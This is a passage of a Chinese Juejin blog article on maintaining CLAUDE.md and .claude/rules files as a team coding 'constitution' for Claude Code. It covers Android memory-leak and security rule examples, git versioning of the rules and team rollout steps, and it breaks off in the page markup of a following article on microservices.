function calculateTotalPrice(item: Item): number {
  // 基础价格 + 10% 增值税
  const priceWithTax = item.value * 1.1;

  // 加上奖励积分(如有),减去折扣
  return priceWithTax + (item.bonus ?? 0) - item.discount;
}

// ❌ 错误: 缺少注释
function calculateTotalPrice(item: Item): number {
  return item.value * 1.1 + (item.bonus ?? 0) - item.discount;
}
\<span class="hljs-code">`\`</span>\`
</code></pre>
<p><strong>注意</strong>：规则应该放在 rules/ 目录下，而不是 CLAUDE.md 中。CLAUDE.md 只存放项目事实。</p>
<p><strong>步骤 4: 提交与同步</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 更新规则文件</span>
git add .claude/rules/coding-style.md
git commit -m <span class="hljs-string">"docs(claude): add business logic comment requirement"</span>

<span class="hljs-comment"># 2. 推送到远程仓库</span>
git push origin main

<span class="hljs-comment"># 3. 团队成员拉取最新代码</span>
<span class="hljs-comment"># 下次使用 Claude Code 时自动生效</span>
</code></pre>
<p><strong>步骤 5: 全员受益</strong></p>
<p>所有团队成员(包括 AI)都自动遵守新规范,类似问题不再出现。</p>
<pre><code class="hljs language-less" lang="less">效果:
  <span class="hljs-selector-tag">-</span> 开发者 <span class="hljs-selector-tag">A</span>: 下次写代码时,<span class="hljs-selector-tag">Claude</span> <span class="hljs-selector-tag">Code</span> 自动添加注释
  <span class="hljs-selector-tag">-</span> 开发者 <span class="hljs-selector-tag">B</span>: 第一次接触这个规范,<span class="hljs-selector-tag">AI</span> 生成的代码已经符合
  <span class="hljs-selector-tag">-</span> 开发者 <span class="hljs-selector-tag">C</span>: 维护老代码时,<span class="hljs-selector-tag">AI</span> 重构时自动加上注释

结果: 团队整体代码质量提升,<span class="hljs-selector-tag">Code</span> <span class="hljs-selector-tag">Review</span> 效率提高
</code></pre>
<h3 data-id="heading-15">4.3 真实案例:从代码缺陷到宪法条款</h3>
<p><strong>背景</strong>:</p>
<p>某 Android 项目在生产环境出现内存泄漏,排查后发现是因为 Activity 中的匿名内部类持有了外部引用。</p>
<p><strong>问题代码</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MainActivity.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> <span class="hljs-keyword">data</span>: String = <span class="hljs-string">""</span>

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)

        <span class="hljs-comment">// ❌ 问题: 匿名内部类持有 Activity 引用</span>
        button.setOnClickListener(<span class="hljs-keyword">object</span> : View.OnClickListener {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onClick</span><span class="hljs-params">(v: <span class="hljs-type">View</span>?)</span></span> {
                <span class="hljs-comment">// 使用了外部类的成员变量</span>
                processData(<span class="hljs-keyword">data</span>)
            }
        })
    }
}
</code></pre>
<p><strong>根因分析</strong>:</p>
<ol>
<li>匿名内部类隐式持有外部类引用</li>
<li>如果 listener 的生命周期超过 Activity,会导致内存泄漏</li>
<li>团队之前没有明确的规范来避免这个问题</li>
</ol>
<p><strong>解决方案</strong>:</p>
<p>更新 rules/security.md,添加 Android 内存泄漏防护规范:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># rules/security.md</span>

<span class="hljs-section">## Android 内存泄漏防护</span>

<span class="hljs-section">#### 避免匿名内部类持有 Activity 引用</span>
<span class="hljs-bullet">-</span> ❌ 禁止: 在 Activity/Fragment 中使用匿名内部类作为长生命周期监听器
<span class="hljs-bullet">-</span> ✅ 使用: Lambda 表达式或静态内部类 + 弱引用

\<span class="hljs-code">`\`</span>\`kotlin
// ❌ 错误: 匿名内部类
button.setOnClickListener(object : View.OnClickListener {
<span class="hljs-code">    override fun onClick(v: View?) {
        processData(data)  // 持有外部引用
    }
})
</span>
// ✅ 正确: Lambda 表达式
button.setOnClickListener { view -&gt;
<span class="hljs-code">    processData(data)  // Kotlin 编译器优化,不会泄漏
}
</span>
// ✅ 正确: 静态内部类 + 弱引用
class MainActivity : AppCompatActivity() {
<span class="hljs-code">    private val clickListener = ClickListener(this)
</span>
<span class="hljs-code">    override fun onCreate(savedInstanceState: Bundle?) {
        button.setOnClickListener(clickListener)
    }
</span>
<span class="hljs-code">    private class ClickListener(activity: MainActivity) : View.OnClickListener {
        private val activityRef = WeakReference(activity)
</span>
<span class="hljs-code">        override fun onClick(v: View?) {
            activityRef.get()?.processData()
        }
    }
}
\`\`\`
</span>
<span class="hljs-section">#### Handler 使用规范</span>
<span class="hljs-bullet">-</span> 使用静态 Handler + 弱引用
<span class="hljs-bullet">-</span> 在 onDestroy 中移除所有消息

\<span class="hljs-code">`\`</span>\`kotlin
// ✅ 正确
class MainActivity : AppCompatActivity() {
<span class="hljs-code">    private val handler = MyHandler(this)
</span>
<span class="hljs-code">    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }
</span>
<span class="hljs-code">    private class MyHandler(activity: MainActivity) : Handler(Looper.getMainLooper()) {
        private val activityRef = WeakReference(activity)
</span>
<span class="hljs-code">        override fun handleMessage(msg: Message) {
            activityRef.get()?.handleMessage(msg)
        }
    }
}
\`\`\`
</span></code></pre>
<p><strong>效果</strong>:</p>
<ol>
<li><strong>immediate(立即生效)</strong>: 下次使用 Claude Code 生成代码时,自动符合新规范</li>
<li><strong>Prevention(预防问题)</strong>: 类似的内存泄漏问题不再出现</li>
<li><strong>Knowledge Transfer(知识传递)</strong>: 新入职的开发者通过 AI 生成的代码学习最佳实践</li>
</ol>
<p><strong>关键点</strong>：这个规范应该放在 <code>rules/security.md</code> 中，而不是 <code>CLAUDE.md</code>。CLAUDE.md 只存放项目事实（如技术栈、常用命令），详细的规则约束都应该放在 rules/ 目录下。</p>
<h3 data-id="heading-16">4.4 版本管理:宪法的演进历史</h3>
<p><strong>为什么需要版本管理?</strong></p>
<ul>
<li>追溯规范变更的原因和时间</li>
<li>回滚不合理的规范修改</li>
<li>了解团队规范的演进路径</li>
</ul>
<p><strong>实践方法</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. CLAUDE.md 和 rules/ 与代码一起提交到 Git</span>
git add CLAUDE.md .claude/rules/
git commit -m <span class="hljs-string">"docs(claude): add memory leak prevention rules"</span>

<span class="hljs-comment"># 2. 查看宪法演进历史</span>
git <span class="hljs-built_in">log</span> --oneline -- CLAUDE.md .claude/rules/

<span class="hljs-comment"># 输出:</span>
a1b2c3d docs(claude): add memory leak prevention rules
d4e5f6g docs(claude): update naming conventions
g7h8i9j docs(claude): add security guidelines
j0k1l2m docs(claude): initial team constitution

<span class="hljs-comment"># 3. 查看某次修改的具体内容</span>
git show a1b2c3d

<span class="hljs-comment"># 4. 回滚到之前的版本(如果需要)</span>
git checkout d4e5f6g -- CLAUDE.md .claude/rules/
</code></pre>
<p><strong>版本号管理(可选)</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># Team Constitution</span>

<span class="hljs-strong">**Version**</span>: 2.3.0
<span class="hljs-strong">**Last Updated**</span>: 2026-01-29
<span class="hljs-strong">**Changelog**</span>: See CLAUDE<span class="hljs-emphasis">_CHANGELOG.md

## Version History
- v2.3.0 (2026-01-29): Add Android memory leak prevention
- v2.2.0 (2026-01-15): Update testing requirements
- v2.1.0 (2026-01-05): Add security guidelines
- v2.0.0 (2025-12-20): Major refactor, adopt Clean Architecture
- v1.0.0 (2025-12-01): Initial team constitution
</span></code></pre>
<h3 data-id="heading-17">4.5 团队协作:宪法的共同维护</h3>
<p><strong>维护策略</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## 团队宪法维护指南</span>

<span class="hljs-section">### 谁可以修改?</span>
<span class="hljs-bullet">-</span> 所有团队成员都可以提出修改建议
<span class="hljs-bullet">-</span> Tech Lead 负责最终审核

<span class="hljs-section">### 修改流程</span>
<span class="hljs-bullet">1.</span> 发现问题或改进点
<span class="hljs-bullet">2.</span> 创建 Issue 讨论必要性
<span class="hljs-bullet">3.</span> 提交 PR 修改 CLAUDE.md 或 .claude/rules/ 下的规则文件
<span class="hljs-bullet">4.</span> Tech Lead 审核
<span class="hljs-bullet">5.</span> 合并后全员通知

<span class="hljs-section">### 定期回顾</span>
<span class="hljs-bullet">-</span> 每月: 团队会议回顾宪法执行情况
<span class="hljs-bullet">-</span> 每季度: 全面审查和优化
</code></pre>
<p><strong>沟通机制</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 示例: PR 提交说明</span>

<span class="hljs-section">## 为什么需要这个修改?</span>
在最近的 Code Review 中,我们发现多个 PR 都出现了日期格式不统一的问题:
<span class="hljs-bullet">-</span> 有的用 <span class="hljs-code">`YYYY-MM-DD`</span>
<span class="hljs-bullet">-</span> 有的用 <span class="hljs-code">`MM/DD/YYYY`</span>
<span class="hljs-bullet">-</span> 有的用时间戳

这导致前后端对接时经常出错。

<span class="hljs-section">## 提议的规范</span>
统一使用 ISO 8601 格式(<span class="hljs-code">`YYYY-MM-DDTHH:mm:ssZ`</span>)

<span class="hljs-section">## 影响范围</span>
<span class="hljs-bullet">-</span> 前端展示日期时需要格式化
<span class="hljs-bullet">-</span> 后端 API 返回统一格式
<span class="hljs-bullet">-</span> 数据库存储使用 UTC 时间

<span class="hljs-section">## 相关讨论</span>
Issue #123: Date format inconsistency
</code></pre>
<hr/>
<h2 data-id="heading-18">五、实战案例:构建 Android 团队的团队宪法</h2>
<h3 data-id="heading-19">5.1 目录结构</h3>
<pre><code class="hljs language-text" lang="text">android-project/
├─ CLAUDE.md
└─ .claude/
   └─ rules/
      ├─ security.md
      ├─ testing.md
      └─ coding-style.md
</code></pre>
<h3 data-id="heading-20">5.2 CLAUDE.md：项目事实</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># Android Project - Claude Code Configuration</span>

<span class="hljs-section">## 项目概述</span>
<span class="hljs-bullet">-</span> 技术栈：Kotlin 1.9+、Android 14 (API 34)、MVVM + Clean Architecture
<span class="hljs-bullet">-</span> DI：Hilt
<span class="hljs-bullet">-</span> Async：Coroutines + Flow
<span class="hljs-bullet">-</span> UI：Jetpack Compose
<span class="hljs-bullet">-</span> Testing：JUnit5, Mockk, Espresso

<span class="hljs-section">## 目录结构入口</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`app/src/main/java/`</span> - 源代码目录
<span class="hljs-bullet">-</span> <span class="hljs-code">`app/src/test/java/`</span> - 单元测试目录
<span class="hljs-bullet">-</span> <span class="hljs-code">`app/src/androidTest/java/`</span> - UI 测试目录

<span class="hljs-section">## 常用命令（必须准确）</span>
<span class="hljs-bullet">-</span> 安装依赖：<span class="hljs-code">`./gradlew build`</span>
<span class="hljs-bullet">-</span> 运行测试：<span class="hljs-code">`./gradlew test`</span>
<span class="hljs-bullet">-</span> 运行 UI 测试：<span class="hljs-code">`./gradlew connectedAndroidTest`</span>
<span class="hljs-bullet">-</span> 构建 APK：<span class="hljs-code">`./gradlew assembleDebug`</span>
<span class="hljs-bullet">-</span> 代码格式化：<span class="hljs-code">`./gradlew ktlintFormat`</span>
<span class="hljs-bullet">-</span> 静态检查：<span class="hljs-code">`./gradlew ktlintCheck`</span>

<span class="hljs-section">## 约束（团队共识）</span>
<span class="hljs-bullet">-</span> 默认先用 Plan Mode 分析，再动代码
<span class="hljs-bullet">-</span> 任何会影响行为的改动：必须补测试/补文档
<span class="hljs-bullet">-</span> 涉及凭证/权限：先安全审查，再合并
<span class="hljs-bullet">-</span> ViewModel 不持有 Activity/Fragment 引用
<span class="hljs-bullet">-</span> 网络/数据库操作必须使用 suspend 函数
</code></pre>
<h3 data-id="heading-21">5.3 rules/coding-style.md：代码风格底线</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># Kotlin 代码风格规范</span>

<span class="hljs-section">## 命名约定</span>
<span class="hljs-bullet">-</span> 类/接口: PascalCase (UserRepository)
<span class="hljs-bullet">-</span> 函数/属性: camelCase (getUserById)
<span class="hljs-bullet">-</span> 常量: UPPER<span class="hljs-emphasis">_SNAKE_</span>CASE (MAX<span class="hljs-emphasis">_RETRY_</span>COUNT)
<span class="hljs-bullet">-</span> 包名: 小写,单词间用点分隔 (com.example.app)

<span class="hljs-section">## 属性声明</span>
<span class="hljs-bullet">-</span> 优先使用 <span class="hljs-code">`val`</span> 而不是 <span class="hljs-code">`var`</span>
<span class="hljs-bullet">-</span> 私有属性使用 <span class="hljs-code">`private`</span> 显式标记
<span class="hljs-bullet">-</span> 可空类型明确标注 <span class="hljs-code">`?`</span>

<span class="hljs-section">## 异步编程</span>
<span class="hljs-bullet">-</span> 使用 Coroutines,避免 Callback
<span class="hljs-bullet">-</span> 网络/数据库操作使用 <span class="hljs-code">`suspend`</span> 函数
<span class="hljs-bullet">-</span> UI 层使用 <span class="hljs-code">`StateFlow`</span> / <span class="hljs-code">`SharedFlow`</span>

<span class="hljs-section">## 资源命名</span>
<span class="hljs-bullet">-</span> Drawable: <span class="hljs-code">`ic_*`</span> (图标), <span class="hljs-code">`bg_*`</span> (背景), <span class="hljs-code">`img_*`</span> (图片)
<span class="hljs-bullet">-</span> Layout: <span class="hljs-code">`activity_*.xml`</span>, <span class="hljs-code">`fragment_*.xml`</span>, <span class="hljs-code">`item_*.xml`</span>
<span class="hljs-bullet">-</span> String: 模块<span class="hljs-emphasis">_功能_</span>描述 (<span class="hljs-code">`user_profile_title`</span>)
</code></pre>
<h3 data-id="heading-22">5.4 rules/testing.md：测试底线</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 测试规范</span>

<span class="hljs-section">## 单元测试</span>
<span class="hljs-bullet">-</span> 覆盖率: &gt; 80%
<span class="hljs-bullet">-</span> UseCase 和 Repository 必须有单元测试
<span class="hljs-bullet">-</span> 使用 Mockk 进行 Mock
<span class="hljs-bullet">-</span> 测试用例命名: <span class="hljs-code">`should ... when ...`</span>

<span class="hljs-section">## UI 测试</span>
<span class="hljs-bullet">-</span> 关键流程必须有 Espresso 测试
<span class="hljs-bullet">-</span> 使用 Hilt Test 进行依赖注入

<span class="hljs-section">## TDD 流程</span>
<span class="hljs-bullet">-</span> RED: 先写失败的测试
<span class="hljs-bullet">-</span> GREEN: 实现最小代码让测试通过
<span class="hljs-bullet">-</span> REFACTOR: 重构优化代码
</code></pre>
<h3 data-id="heading-23">5.5 rules/security.md：安全底线</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 安全规范</span>

<span class="hljs-section">## 敏感信息处理</span>
<span class="hljs-bullet">-</span> ❌ 禁止: 将密钥/密码硬编码到代码中
<span class="hljs-bullet">-</span> ✅ 使用: BuildConfig 或 NDK 存储 API Key
<span class="hljs-bullet">-</span> ✅ 使用: EncryptedSharedPreferences 存储用户密码/Token

<span class="hljs-section">## 内存泄漏防护</span>
<span class="hljs-bullet">-</span> ViewModel 不持有 Activity/Fragment 引用
<span class="hljs-bullet">-</span> 长生命周期对象使用 ApplicationContext
<span class="hljs-bullet">-</span> 使用 Lifecycle-aware 组件

<span class="hljs-section">## 权限请求</span>
<span class="hljs-bullet">-</span> 使用 ActivityResultContracts
<span class="hljs-bullet">-</span> 说明权限用途,提升授权率
</code></pre>
<hr/>
<h2 data-id="heading-24">六、最佳实践与建议</h2>
<h3 data-id="heading-25">6.1 如何编写有效的宪法条款</h3>
<p><strong>原则 1: 具体而非抽象</strong></p>
<p>❌ 不好的例子:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">-</span> 代码应该写得清晰
<span class="hljs-bullet">-</span> 注释要写好
<span class="hljs-bullet">-</span> 性能要优化
</code></pre>
<p>✅ 好的例子:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">-</span> 所有公共 API 必须添加 JSDoc 注释,包含参数说明和示例
<span class="hljs-bullet">-</span> 函数复杂度不超过 15(Cyclomatic Complexity)
<span class="hljs-bullet">-</span> API 响应时间 P95 &lt; 200ms
</code></pre>
<p><strong>原则 2: 提供正反示例</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### 错误处理</span>

✅ 正确:
\<span class="hljs-code">`\`</span>\`typescript
try {
  const data = await fetchData();
  return data;
} catch (error: unknown) {
  if (error instanceof NetworkError) {
<span class="hljs-code">    logger.error('Network request failed', { error });
    throw new ServiceUnavailableError('Service temporarily unavailable');
  }
  throw error;
}
\`\`\`
</span>
❌ 错误:
\<span class="hljs-code">`\`</span>\`typescript
try {
  const data = await fetchData();
  return data;
} catch (e) {
  console.log(e);  // 只打印日志,不处理
  return null;     // 吞掉异常
}
\<span class="hljs-code">`\`</span>\`
</code></pre>
<p><strong>原则 3: 说明"为什么"</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### 优先使用 `const` 而不是 `let`</span>

<span class="hljs-strong">**原因**</span>:
<span class="hljs-bullet">-</span> 提高代码可读性:变量不可变更,减少认知负担
<span class="hljs-bullet">-</span> 避免意外修改:防止 bug
<span class="hljs-bullet">-</span> 优化性能:编译器可以更好地优化

<span class="hljs-strong">**例外情况**</span>:
<span class="hljs-bullet">-</span> 循环计数器
<span class="hljs-bullet">-</span> 累加器变量
</code></pre>
<p><strong>原则 4: 设置优先级</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## 编码规范优先级</span>

<span class="hljs-section">### P0 (必须遵守,否则拒绝合并)</span>
<span class="hljs-bullet">-</span> 所有敏感信息不得硬编码
<span class="hljs-bullet">-</span> 必须通过单元测试
<span class="hljs-bullet">-</span> 不得出现 ESLint error

<span class="hljs-section">### P1 (强烈建议,Code Review 会提出)</span>
<span class="hljs-bullet">-</span> 公共 API 必须有 JSDoc
<span class="hljs-bullet">-</span> 复杂逻辑必须有注释
<span class="hljs-bullet">-</span> 测试覆盖率 &gt; 80%

<span class="hljs-section">### P2 (建议,但不强制)</span>
<span class="hljs-bullet">-</span> 使用 TypeScript 类型推断简化代码
<span class="hljs-bullet">-</span> 优先使用函数式编程
</code></pre>
<h3 data-id="heading-26">6.2 如何让 AI 理解和遵守规范</h3>
<p><strong>技巧 1: 使用清晰的标记</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## 规范标记说明</span>

<span class="hljs-bullet">-</span> ✅ <span class="hljs-strong">**必须**</span>: 强制执行,不可违反
<span class="hljs-bullet">-</span> ⚠️ <span class="hljs-strong">**推荐**</span>: 强烈建议,有特殊原因可例外
<span class="hljs-bullet">-</span> 💡 <span class="hljs-strong">**建议**</span>: 最佳实践,可根据情况调整
<span class="hljs-bullet">-</span> ❌ <span class="hljs-strong">**禁止**</span>: 绝对不允许
</code></pre>
<p><strong>技巧 2: 结构化组织</strong></p>
<p>按照官方推荐的目录结构组织：</p>
<pre><code class="hljs language-text" lang="text">your-repo/
├─ CLAUDE.md              # 项目事实
└─ .claude/
   └─ rules/              # 底线规则
      ├─ security.md
      ├─ testing.md
      └─ coding-style.md
</code></pre>
<p>每个文件职责单一，便于维护和审查。</p>
<p><strong>技巧 3: 使用关键词强调</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### 安全规范</span>

⚠️ <span class="hljs-strong">**CRITICAL**</span>: 绝对不允许将密钥硬编码到代码中

❌ <span class="hljs-strong">**NEVER**</span> do this:
\<span class="hljs-code">`\`</span>\`typescript
const API<span class="hljs-emphasis">_KEY = 'sk-1234567890abcdef';
\`\`\`

✅ <span class="hljs-strong">**ALWAYS**</span> use environment variables:
\`\`\`typescript
const API_</span>KEY = process.env.API<span class="hljs-emphasis">_KEY;
\`\`\`
</span></code></pre>
<p><strong>技巧 4: 提供决策树</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### 何时使用缓存?</span>

\<span class="hljs-code">`\`</span>\`
数据是否频繁读取?
  ├─ 是 → 数据是否经常变化?
  │       ├─ 是 → 使用短 TTL 缓存(5分钟)
  │       └─ 否 → 使用长 TTL 缓存(1小时)
  └─ 否 → 不使用缓存,直接查询
\<span class="hljs-code">`\`</span>\`
</code></pre>
<h3 data-id="heading-27">6.3 团队推广策略</h3>
<p><strong>阶段 1: 试点项目(第1周)</strong></p>
<ol>
<li>选择一个小型项目作为试点</li>
<li>编写基础的 CLAUDE.md（项目事实）和 rules/ 目录（核心规范）</li>
<li>团队成员轮流使用 Claude Code</li>
<li>收集反馈,快速迭代</li>
</ol>
<p><strong>阶段 2: 规范完善(第2-4周)</strong></p>
<ol>
<li>根据实际使用发现的问题更新规范</li>
<li>添加更多示例和说明</li>
<li>组织团队培训,讲解规范的价值</li>
<li>建立规范更新机制</li>
</ol>
<p><strong>阶段 3: 全面推广(第5-8周)</strong></p>
<ol>
<li>在所有项目中启用 claude.md</li>
<li>将 claude.md 检查加入 CI/CD 流程</li>
<li>定期回顾和优化规范</li>
<li>分享成功案例和数据</li>
</ol>
<p><strong>阶段 4: 持续改进(长期)</strong></p>
<ol>
<li>建立复利模式:发现问题 → 更新宪法</li>
<li>跟踪指标:代码质量、Code Review 时间、Bug 数量</li>
<li>定期团队分享:最佳实践、踩坑经验</li>
<li>版本管理:重大更新时升级版本号</li>
</ol>
<p><strong>推广技巧</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### 让团队接受 claude.md 的技巧</span>

<span class="hljs-bullet">1.</span> <span class="hljs-strong">**展示收益,不是约束**</span>
<span class="hljs-bullet">   -</span> "这能让 Code Review 时间减少 50%"
<span class="hljs-bullet">   -</span> "新人上手速度提升 3 倍"
<span class="hljs-bullet">   -</span> "Bug 数量下降 40%"

<span class="hljs-bullet">2.</span> <span class="hljs-strong">**从痛点出发**</span>
<span class="hljs-bullet">   -</span> "还记得上周那个低级 Bug 吗?如果有规范就能避免"
<span class="hljs-bullet">   -</span> "每次 Code Review 都在说同样的问题,累不累?"

<span class="hljs-bullet">3.</span> <span class="hljs-strong">**小步快跑**</span>
<span class="hljs-bullet">   -</span> 不要一次性写 100 条规范
<span class="hljs-bullet">   -</span> 从 3-5 条核心规范开始（放在 rules/ 目录）
<span class="hljs-bullet">   -</span> 逐步完善,让团队适应

<span class="hljs-bullet">4.</span> <span class="hljs-strong">**让大家参与**</span>
<span class="hljs-bullet">   -</span> 规范不是 Tech Lead 一个人定的
<span class="hljs-bullet">   -</span> 鼓励所有人提出改进建议
<span class="hljs-bullet">   -</span> 定期讨论和投票决定重要条款
</code></pre>
<hr/>
<h2 data-id="heading-28">七、总结与行动指南</h2>
<h3 data-id="heading-29">7.1 核心要点回顾</h3>
<p>通过本文,我们深入探讨了 claude.md 作为"团队宪法"的价值:</p>
<p><strong>1. 为什么需要团队宪法?</strong></p>
<ul>
<li>传统规范靠人肉执行,效率低、易遗漏</li>
<li>AI 辅助开发需要明确规范,否则代码质量参差不齐</li>
<li>claude.md 是自动化、统一、可演进的解决方案</li>
</ul>
<p><strong>2. claude.md 的工作机制</strong></p>
<ul>
<li>两级配置:全局 + 项目,项目配置覆盖全局配置</li>
<li>作为系统提示词注入到每次 AI 调用,优先级高于对话历史</li>
</ul>
<p><strong>3. 团队宪法的内容设计</strong></p>
<ul>
<li>CLAUDE.md：项目事实（技术栈、常用命令、约束）</li>
<li>rules/ 目录：底线规则（security.md、testing.md、coding-style.md）</li>
</ul>
<p><strong>4. 复利模式:持续演进</strong></p>
<ul>
<li>发现问题 → 更新宪法 → 全员受益</li>
<li>版本管理:Git 跟踪规范演进</li>
<li>团队协作:共同维护,定期回顾</li>
</ul>
<p><strong>5. 实战案例:Android 团队</strong></p>
<ul>
<li>完整的 CLAUDE.md 和 rules/ 目录示例</li>
<li>职责分离：CLAUDE.md 存项目事实，rules/ 存规则约束</li>
<li>数据证明:Code Review 时间减少 80%</li>
</ul>
<hr/>
<blockquote>
<p>💡 <strong>思考题</strong>: 你的团队目前有哪些规范执行不到位的问题?如果用 CLAUDE.md 和rule来解决,你会先写哪 3 条规范?</p>
</blockquote>
<p>🔗 <strong>相关文章</strong>:</p>
<ul>
<li><a href="https://juejin.cn/post/7601034810313080886" target="_blank" title="https://juejin.cn/post/7601034810313080886">上一篇: 深入理解 Claude Code</a></li>
</ul>
<hr/>
<p>📥 <strong>下载资源</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchendongqi%2Fawesome-ai-coding%2Ftree%2Fmain%2Frules" target="_blank" title="https://github.com/chendongqi/awesome-ai-coding/tree/main/rules" ref="nofollow noopener noreferrer">Awesome AI Coding</a> - 覆盖大部分开发领域的规则集合</li>
</ul>
<p><em>如果这篇文章对你有帮助,欢迎点赞、收藏、分享!有任何问题或建议,欢迎在评论区留言讨论。让我们一起学习,一起成长!</em></p>
<p><em>也欢迎访问我的<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a>发现更多宝藏资源</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[微服务管理 | 服务注册与发现]]></title>    <link>https://juejin.cn/post/7602401081265979428</link>    <guid>https://juejin.cn/post/7602401081265979428</guid>    <pubDate>2026-02-03T12:41:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602401081265979428" data-draft-id="7602411521071251475" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="微服务管理 | 服务注册与发现"/> <meta itemprop="keywords" content="微服务,后端"/> <meta itemprop="datePublished" content="2026-02-03T12:41:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码财同行"/> <meta itemprop="url" content="https://juejin.cn/user/3883950915978728"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            微服务管理 | 服务注册与发现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3883950915978728/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码财同行
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:41:56.000Z" title="Tue Feb 03 2026 12:41:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body 